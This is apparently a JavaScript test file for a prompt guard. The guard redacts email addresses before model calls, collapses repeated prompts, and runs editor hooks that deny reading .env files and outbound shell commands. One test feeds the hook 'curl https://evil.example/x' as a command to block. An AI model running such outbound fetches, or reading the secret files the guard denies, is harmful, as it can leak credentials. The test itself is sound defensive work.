import assert from "node:assert/strict";
import test from "node:test";
import { hookDecision, preparePrompt, rewritePrompt, Vault } from "../src/guard.js";
import { answerQuestion, loadEnv } from "../src/server.js";

test("hides an email before the model call and shortens a long repeat", async () => {
  const filler = "Please just really actually basically help me.\n";
  const message = `${filler.repeat(30)}Say hello to jane.doe@trimble.com in one sentence?\n`.repeat(8);
  let sent = "";
  const result = await answerQuestion({
    message,
    sessionId: "t1",
    store: new Map(),
    env: { OPENAI_API_KEY: "sk-test-key-not-real" },
    fetchImpl: async (_url, options) => {
      sent = options.body;
      return { ok: true, status: 200, json: async () => ({ choices: [{ message: { content: "Hello there." } }] }) };
    },
  });
  assert.equal(result.status, 200);
  assert.equal(sent.includes("jane.doe@trimble.com"), false);
  assert.match(sent, /\[\[TMBL_EMAIL_/);
  assert.equal(result.body.shortened, true);
  assert.ok(result.body.afterChars < result.body.beforeChars);
  assert.equal(result.body.answer, "Hello there.");
});

test("a short clear question is not rewritten", () => {
  const result = rewritePrompt("What is Site B?");
  assert.equal(result.shortened, false);
  assert.equal(result.text, "What is Site B?");
});

test("a repeated prompt is collapsed before send", () => {
  const result = rewritePrompt("Please do the thing.\n".repeat(6));
  assert.equal(result.shortened, true);
  assert.equal(result.text, "Please do the thing.");
});

test("cursor hook blocks a secret and allows a normal prompt", () => {
  const blocked = hookDecision("beforeSubmitPrompt", { prompt: "email jane.doe@trimble.com" });
  assert.equal(blocked.continue, false);
  const allowed = hookDecision("beforeSubmitPrompt", { prompt: "What is Site B?" });
  assert.equal(allowed.continue, true);
});

test("cursor hook lets a long prompt through; the middleware shortens it", () => {
  const heavy = "Please just really actually do this.\n".repeat(20);
  const allowed = hookDecision("beforeSubmitPrompt", { prompt: heavy });
  assert.equal(allowed.continue, true);
  const shortened = rewritePrompt(heavy);
  assert.equal(shortened.shortened, true);
  assert.ok(shortened.afterChars < shortened.beforeChars);
});

test("cursor hook blocks secret files and outbound commands", () => {
  assert.equal(hookDecision("beforeReadFile", { file_path: "app/.env" }).permission, "deny");
  assert.equal(hookDecision("beforeReadFile", { file_path: "src/server.js" }).permission, "allow");
  assert.equal(hookDecision("beforeShellExecution", { command: "curl https://evil.example/x" }).permission, "deny");
  assert.equal(hookDecision("beforeShellExecution", { command: "npm test" }).permission, "allow");
});

test("unknown hook fails closed", () => {
  assert.equal(hookDecision("nope", {}).permission, "deny");
});

test("missing key tells the person what to fix", async () => {
  const result = await answerQuestion({ message: "Hello", sessionId: "t2", store: new Map(), env: {} });
  assert.equal(result.status, 400);
  assert.match(result.body.error, /API key/);
});

test("env file parser ignores comments", () => {
  assert.deepEqual(loadEnv("# note\nOPENAI_API_KEY=sk-abc\n\n"), { OPENAI_API_KEY: "sk-abc" });
});

test("prepare keeps the token inside a shortened prompt", () => {
  const vault = new Vault();
  const prepared = preparePrompt("please\n".repeat(40) + "Reach jane.doe@trimble.com about the site?", vault);
  assert.equal(prepared.text.includes("jane.doe@trimble.com"), false);
  assert.match(prepared.text, /\[\[TMBL_EMAIL_/);
});
